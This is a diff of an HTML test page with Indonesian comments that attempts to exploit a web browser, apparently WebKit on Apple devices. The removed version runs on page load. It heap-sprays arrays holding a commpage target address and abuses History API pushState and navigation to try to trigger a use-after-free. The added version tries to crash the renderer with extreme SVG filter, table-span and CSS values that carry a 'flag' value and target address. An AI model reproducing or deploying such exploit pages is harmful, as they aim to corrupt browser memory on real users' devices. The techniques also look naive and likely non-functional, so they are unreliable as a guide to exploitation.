@@ -1,123 +1,43 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <title>History API State Corruption Attack</title>
+    <title>ASB Target Flag Test</title>
+    <style>
+        /* Mencoba memicu rekursi pada mesin CSS */
+        * { 
+            --target: "0x08ad752109466b05"; /* Nilai Flag Apple */
+            --addr: "0x0000000fffffc328";   /* Alamat Target Apple */
+            border: 1px solid var(--target);
+        }
+    </style>
 </head>
 <body>
 
-    <h1>History API State Corruption (Commpage Target)</h1>
-    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Serangan History API...</p>
-    <div id="log-area"></div>
+    <svg xmlns="http://www.w3.org/2000/svg" height="100" width="100">
+        <filter id="crashFilter">
+            <feTurbulence baseFrequency="0.01" numOctaves="5000" seed="1" />
+            <feColorMatrix values="0x08ad752109466b05 0 0 0 0 0 0x08ad752109466b05 0 0 0 0 0 1 0" />
+        </filter>
+        <rect width="100%" height="100%" filter="url(#crashFilter)" />
+    </svg>
 
-    <script>
-        // --- KONSTANTA COMM PAGE ---
-        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
-        
-        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
+    <table border="1">
+        <tr>
+            <td colspan="65535" rowspan="65535">
+                ASB_TARGET_VALUE_0x08ad752109466b05
+            </td>
+        </tr>
+    </table>
 
-        let startTime = performance.now();
-        let payloadHolders = []; 
-        let historyStates = []; // Menyimpan referensi state
+    <div 
+        data-asb-val="0x08ad752109466b05" 
+        data-asb-addr="0x0000000fffffc328"
+        class="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        id="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+    >
+        Memuat data...
+    </div>
 
-        function log(message, type = 'log-info') {
-            const timeElapsed = (performance.now() - startTime).toFixed(2);
-            const logElement = document.getElementById('log-area');
-            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
-            logElement.scrollTop = logElement.scrollHeight;
-        }
-
-        // --- FUNGSI HEAP SPRAY PAYLOAD ---
-        function sprayPayload() {
-            log("Memulai Spraying Payload...", "log-spray");
-            const SPRAY_COUNT = 1500;
-            const PAYLOAD_SIZE = 64; 
-
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                payloadArray[0] = HIGH_WORD; 
-                payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2031.0 + i; 
-                payloadHolders.push(payloadArray); 
-            }
-        }
-
-        // --- FUNGSI UTAMA ATTACK ---
-        function runHistoryAttack() {
-            startTime = performance.now();
-            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");
-
-            const HISTORY_COUNT = 100;
-            const STATE_ARRAY_SIZE = 1024 * 1024; // State 4MB (cukup besar untuk fragmentasi heap)
-            
-            // 1. Fragmentasi Heap dengan History State
-            for (let i = 0; i < HISTORY_COUNT; i++) {
-                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
-                // Isi array dengan nilai yang unik
-                stateArray.fill(0xFEEDFACE + i);
-                
-                // Gunakan pushState untuk menyimpan objek yang besar dan kompleks
-                // Ini memaksa serialization dan alokasi memori C++ di History Cache
-                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
-                historyStates.push(stateArray);
-            }
-            log(`Phase 2: ${HISTORY_COUNT} History State Besar diserialisasi.`, "log-info");
-
-            // 2. Memicu Corrupt State
-            // Kita coba kembali ke state yang sangat tua, berharap memuat ulang objek yang sudah fragmentasi
-            window.history.go(-HISTORY_COUNT + 1);
-            log("Phase 3: Navigasi cepat ke History State awal.", "log-critical");
-
-            // 3. FREE/SPRAY Race
-            // Kita segera membersihkan referensi JavaScript dan melakukan spray
-            // Ini menciptakan UAF di History Cache C++
-            setTimeout(() => {
-                log("Phase 4: Memicu FREE/SPRAY...", "log-critical");
-                
-                // Hapus semua referensi JS (memaksa GC)
-                historyStates = null;
-                
-                // Lakukan Spray Payload
-                sprayPayload(); 
-                
-                // 4. Trigger Eksploitasi: Memicu Pemanggilan State Corrupt
-                // Coba navigasi cepat lagi. WebKit harus membaca objek state yang sudah ditimpa
-                
-                // Menggunakan pushState lagi setelah spray akan mencoba menulis ke lokasi yang sama.
-                let attackerState = new Float64Array(1024); // Array kecil untuk pemicu
-                attackerState.fill(HIGH_WORD);
-                window.history.pushState({ trigger: attackerState }, 'Attack', '#attack');
-
-                log("Phase 5: Navigasi/pushState Attacker. Menunggu Crash Implisit.", "log-critical");
-            }, 100); 
-            
-            // Trigger alternatif: Memicu GC agresif untuk membersihkan History Cache
-            setTimeout(() => {
-                // Tidak ada cara langsung, jadi kita alokasikan banyak memori lagi
-                for(let i = 0; i < 50; i++) {
-                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF); // 5MB x 50 = 250MB filler
-                }
-                log("Trigger GC Implisit selesai.", "log-info");
-            }, 200);
-        }
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian History API Attack...';
-            setTimeout(runHistoryAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah State Corruption.';
-        });
-    </script>
-    <style>
-        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
-        .log-init { color: blue; }
-        .log-info { color: black; }
-        .log-spray { color: purple; }
-        .log-critical { color: red; font-weight: bold; }
-        .log-success { color: green; font-weight: bold; }
-    </style>
 </body>
 </html>
+
